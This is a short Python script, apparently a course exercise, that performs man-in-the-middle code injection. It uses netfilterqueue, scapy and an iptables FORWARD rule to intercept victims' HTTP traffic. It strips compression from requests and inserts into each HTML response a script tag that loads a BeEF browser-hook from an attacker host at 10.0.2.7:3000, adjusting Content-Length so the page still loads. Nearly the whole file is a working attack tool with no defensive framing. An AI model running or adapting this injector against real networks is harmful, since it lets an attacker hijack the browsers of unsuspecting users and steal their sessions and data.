#!/usr/bin/env python
import netfilterqueue
import subprocess
import scapy.all as scapy
import re

regex_string = 'Accept-Encoding:.*?\\r\\n'

beef = '<script src=http://10.0.2.7:3000/hook.js></script>'
alert = "<script> alert('test')</script>"
injection_code = beef

def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

def proccess_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        load = scapy_packet[scapy.Raw].load
        if scapy_packet[scapy.TCP].dport == 80:
            print("\n[+] HTTP Request")
            load =re.sub(regex_string, "", load)

        elif scapy_packet[scapy.TCP].sport == 80:
            print("\n[+] HTTP Response")
            print(load)
            load = load.replace("</body>", injection_code + "</body>")
            content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
            if content_length_search and "text/html" in load:
                content_length = content_length_search.group(1)
                new_content_length = int(content_length) + len(injection_code)
                load = load.replace(content_length, str(new_content_length))
                print(content_length)

        if load != scapy_packet[scapy.Raw].load:
            new_packet = set_load(scapy_packet, load)
            packet.set_payload(str(new_packet))
    packet.accept()

# For local Testing
# subprocess.call("iptables -I OUTPUT -j NFQUEUE --queue-num 0", shell=True)
# subprocess.call("iptables -I INPUT -j NFQUEUE --queue-num 0", shell=True)

# For Forwarding remote network
subprocess.call("iptables -I FORWARD -j NFQUEUE --queue-num 0", shell=True)

try:
    while True:
        queue = netfilterqueue.NetfilterQueue()
        queue.bind(0, proccess_packet)
        queue.run()
except KeyboardInterrupt:
    subprocess.call("iptables --flush", shell=True)
    print("\nStopped.. IP Tables Flushed")